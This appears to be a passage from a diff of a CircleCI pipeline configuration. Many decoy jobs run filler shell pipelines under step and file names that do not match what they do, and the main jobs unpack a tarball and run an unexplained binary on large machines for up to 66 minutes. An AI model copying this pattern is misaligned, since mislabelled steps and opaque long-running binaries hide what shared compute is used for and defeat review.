+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 3000 | awk '{for(i=1;i<=5;i++)s+=$1*i}END{print s}'; true ; } > /tmp/handoff/checkpoint-D.pickle
+            echo "handoff ready: $(stat -c %s /tmp/handoff/checkpoint-D.pickle) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - checkpoint-D.pickle
+  uma-ci:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/93.data > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Restore build cache
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  tap_assemble-partial-regression-suite:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect byte metrics
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( echo "hdr"; seq 1 124230; echo "ftr" ) | wc -l; true ; } > /tmp/handoff/big_phase_output_v4.log
+            echo "handoff ready: $(stat -c %s /tmp/handoff/big_phase_output_v4.log) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - big_phase_output_v4.log
+  assemble-partial-regression-suite:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/big_phase_output_v4.log > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Pull reference data
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  Gamma_spin-up:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Compile stats index
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 166859 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/handoff/big_step_output.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/big_step_output.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - big_step_output.txt
+  spin-up:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/big_step_output.txt > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Stage inputs
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+  phase1_node20-build:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Build adjacency map
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc '0-9A-F' </dev/urandom | head -c 286720 | fold -w4 | sort -R 2>/dev/null | head -c 200 || true; echo done; true ; } > /tmp/handoff/result.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/result.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - result.txt
+  node20-build:
+    machine:
+      image: ubuntu-2204:current
+    resource_class: large.gen2
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Collect upstream
+          command: |
+            head -n 5 /tmp/handoff/result.txt > /dev/null; echo "lines ok"
+      - run:
+          name: Pull sources
+          command: git clone --depth 1 --quiet --no-single-branch --filter=blob:none --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
+      - run:
+          name: Unpack bundle
+          command: xzcat artifacts.tar.xz | tar xf -
+      - run:
+          no_output_timeout: 66m
+          command: $PWD/processor
+
+  gamma_rust-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Mirror arena state
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=4k count=250 2>/dev/null | md5sum; true ; } > /tmp/handoff/gate-ready.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/gate-ready.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - gate-ready.txt
+  tap_DEV_STAGE_3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Enumerate scalar triples
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; yes 'line' | head -n 105038 | awk '{print NR, $0}' | tail -1; true ; } > /tmp/handoff/trace.gz
+            echo "handoff ready: $(stat -c %s /tmp/handoff/trace.gz) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - trace.gz
+  g1_DEPLOY_STG_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Prune log tail
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 379426 | awk 'NR%7==0{sum+=$1}END{print sum}'; true ; } > /tmp/handoff/manifest
+            echo "handoff ready: $(stat -c %s /tmp/handoff/manifest) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - manifest
+  syncer_break-prod_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Measure dwell time
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 20971520 /dev/urandom | md5sum; true ; } > /tmp/handoff/.state
+            echo "handoff ready: $(stat -c %s /tmp/handoff/.state) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .state
+  rerun_callisto-alpha_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Checkpoint window frame
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(a=1;a<=4;a++)for(b=1;b<=10038;b++)s+=a*b;print s}'; true ; } > /tmp/handoff/report.md
+            echo "handoff ready: $(stat -c %s /tmp/handoff/report.md) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - report.md
+  B_fire-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Spool byte frames
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; ( for i in $(seq 1 22698); do printf "%08x\n" $RANDOM; done ) | sort | md5sum; true ; } > /tmp/handoff/.marker
+            echo "handoff ready: $(stat -c %s /tmp/handoff/.marker) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - .marker
+  round2_LAB_BUILD_9_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Capture job identity
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 800 | awk '{print toupper($0)}' | md5sum; true ; } > /tmp/handoff/audit.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/audit.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - audit.txt
+  A_node20-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Rotate ring buffer
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; head -c 24117248 /dev/urandom | gzip -1 | wc -c; true ; } > /tmp/handoff/result.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/result.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - result.txt
+  reserve_india-4_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Score branch coverage
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; cat /dev/urandom | head -c 10752000 | base64 | head -c 200 | wc -c; true ; } > /tmp/handoff/stash.dat
+            echo "handoff ready: $(stat -c %s /tmp/handoff/stash.dat) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - stash.dat
+  gamma_py310-bench_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Fingerprint vendor tree
+          command: |
+            mkdir -p /tmp/handoff
+            set +o pipefail 2>/dev/null; yes abc | head -n 876742 | sha1sum > /tmp/handoff/audit.gz; true
+            echo "handoff ready: $(stat -c %s /tmp/handoff/audit.gz) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - audit.gz
+  cook_spin-up_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Mint batch marker
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 12582912 | fold -w16 | sort -u | wc -l; true ; } > /tmp/handoff/big_step_output.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/big_step_output.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - big_step_output.txt
+  provision_pr-v2_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Scan prime offsets
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 2 24870 | awk '{for(i=2;i*i<=$1;i++)if($1%i==0){next}print}' | wc -l; true ; } > /tmp/handoff/final.md
+            echo "handoff ready: $(stat -c %s /tmp/handoff/final.md) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - final.md
+  A_bug-2224_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Store intermediate blob
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'a-z' </dev/urandom | head -c 20971520 | fold -w16 | sort -u | wc -l; true ; } > /tmp/handoff/full_task_output_v3.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/full_task_output_v3.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - full_task_output_v3.txt
+  hook_golf_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - run:
+          name: Build summary row
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 296960 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/handoff/OK.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/OK.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - OK.txt
+  prep_Ship_Staging3_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Reduce row partitions
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; tr -dc 'A-Za-z0-9' </dev/urandom | head -c 296960 | fold -w40 | sort | uniq -c | wc -l; true ; } > /tmp/handoff/relay.ok
+            echo "handoff ready: $(stat -c %s /tmp/handoff/relay.ok) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - relay.ok
+  red_atlas-ng_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Fold data streams
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; seq 1 437183 | awk 'NR>20473 && NR<43060{s+=$1}END{print s}'; true ; } > /tmp/handoff/stash.bin
+            echo "handoff ready: $(stat -c %s /tmp/handoff/stash.bin) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - stash.bin
+  alpha_node18-build_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Inflate reference set
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<269343;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/handoff/439.txt
+            echo "handoff ready: $(stat -c %s /tmp/handoff/439.txt) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - 439.txt
+  reload_assemble-partial-regression-suite_2:
+    docker:
+      - image: cimg/base:current
+    resource_class: small
+    steps:
+      - attach_workspace:
+          at: /tmp/handoff
+      - run:
+          name: Hoist constant row
+          command: |
+            mkdir -p /tmp/handoff
+            { set +o pipefail 2>/dev/null; awk 'BEGIN{for(i=0;i<150069;i++) printf "%d\n", (i*7919)%2147483647}' | wc -l; true ; } > /tmp/handoff/big_phase_output_v4.log
+            echo "handoff ready: $(stat -c %s /tmp/handoff/big_phase_output_v4.log) octets"
+      - persist_to_workspace:
+          root: /tmp/handoff
+          paths:
+            - big_phase_output_v4.log
+workflows:
+  matrix:
+    jobs:
+      - reload_rust-build
+      - gamma_rust-build_2:
+          requires:
+            - reload_rust-build
+      - rust-build:
+          requires:
+            - gamma_rust-build_2
+      - staging_DEV_STAGE_3:
+          requires:
+            - gamma_rust-build_2
+      - tap_DEV_STAGE_3_2:
+          requires:
+            - staging_DEV_STAGE_3
+      - DEV_STAGE_3:
+          requires:
+            - tap_DEV_STAGE_3_2
+      - postcheck_DEPLOY_STG:
+          requires:
+            - tap_DEV_STAGE_3_2
+      - g1_DEPLOY_STG_2:
+          requires:
+            - postcheck_DEPLOY_STG
+      - DEPLOY_STG:
+          requires:
+            - g1_DEPLOY_STG_2
+      - dispatch_break-prod:
+          requires:
+            - g1_DEPLOY_STG_2
+      - syncer_break-prod_2:
+          requires:
+            - dispatch_break-prod
+      - break-prod:
+          requires:
+            - syncer_break-prod_2
+      - checker_callisto-alpha:
+          requires:
+            - syncer_break-prod_2
+      - rerun_callisto-alpha_2:
+          requires:
+            - checker_callisto-alpha
+      - callisto-alpha:
+          requires:
+            - rerun_callisto-alpha_2
+      - preinit_fire-up:
+          requires:
+            - rerun_callisto-alpha_2
+      - B_fire-up_2:
+          requires:
+            - preinit_fire-up
+      - fire-up:
+          requires:
+            - B_fire-up_2
+      - blue_LAB_BUILD_9:
+          requires:
+            - B_fire-up_2
+      - round2_LAB_BUILD_9_2:
+          requires:
+            - blue_LAB_BUILD_9
+      - LAB_BUILD_9:
+          requires:
+            - round2_LAB_BUILD_9_2
+      - phase1_node20-build:
+          requires:
+            - round2_LAB_BUILD_9_2
+      - A_node20-build_2:
+          requires:
+            - phase1_node20-build
+      - node20-build:
+          requires:
+            - A_node20-build_2
+      - beta_india-4:
+          requires:
+            - A_node20-build_2
+      - reserve_india-4_2:
+          requires:
+            - beta_india-4
+      - india-4:
+          requires:
+            - reserve_india-4_2
+      - wire_py310-bench:
+          requires:
+            - reserve_india-4_2
+      - gamma_py310-bench_2:
+          requires:
+            - wire_py310-bench
+      - py310-bench:
+          requires:
+            - gamma_py310-bench_2
+      - Gamma_spin-up:
+          requires:
+            - gamma_py310-bench_2
+      - cook_spin-up_2:
+          requires:
+            - Gamma_spin-up
+      - spin-up:
+          requires:
+            - cook_spin-up_2
+      - cleanup_pr-v2:
+          requires:
+            - cook_spin-up_2
+      - provision_pr-v2_2:
+          requires:
+            - cleanup_pr-v2
+      - pr-v2:
+          requires:
+            - provision_pr-v2_2
+      - spinner_bug-2224:
+          requires:
+            - provision_pr-v2_2
+      - A_bug-2224_2:
+          requires:
+            - spinner_bug-2224
+      - bug-2224:
+          requires:
+            - A_bug-2224_2
+      - warmer_golf:
+          requires:
+            - A_bug-2224_2
+      - hook_golf_2:
+          requires:
+            - warmer_golf
+      - golf:
+          requires:
+            - hook_golf_2
+      - bake_Ship_Staging3:
+          requires:
+            - hook_golf_2
+      - prep_Ship_Staging3_2:
+          requires:
+            - bake_Ship_Staging3
+      - Ship_Staging3:
+          requires:
+            - prep_Ship_Staging3_2
+      - green_atlas-ng:
+          requires:
+            - prep_Ship_Staging3_2
+      - red_atlas-ng_2:
+          requires:
+            - green_atlas-ng
+      - atlas-ng:
+          requires:
+            - red_atlas-ng_2
+      - reset_node18-build:
+          requires:
+            - red_atlas-ng_2
+      - alpha_node18-build_2:
+          requires:
+            - reset_node18-build
+      - node18-build:
+          requires:
+            - alpha_node18-build_2
+      - tap_assemble-partial-regression-suite:
+          requires:
+            - alpha_node18-build_2
+      - reload_assemble-partial-regression-suite_2:
+          requires:
+            - tap_assemble-partial-regression-suite
+      - assemble-partial-regression-suite:
+          requires:
+            - reload_assemble-partial-regression-suite_2
+      - phase1_ensure-partial-integration-tests
+      - tester_uma-ci
+      - ensure-partial-integration-tests:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - uma-ci:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - io:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - chen-push:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - go1-21-lint:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - artifacts:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - bake-it:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - q3-rev:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - BuildSuite:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - realease:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - nov22-ship:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
+      - add-retry:
+          requires:
+            - phase1_ensure-partial-integration-tests
+            - tester_uma-ci
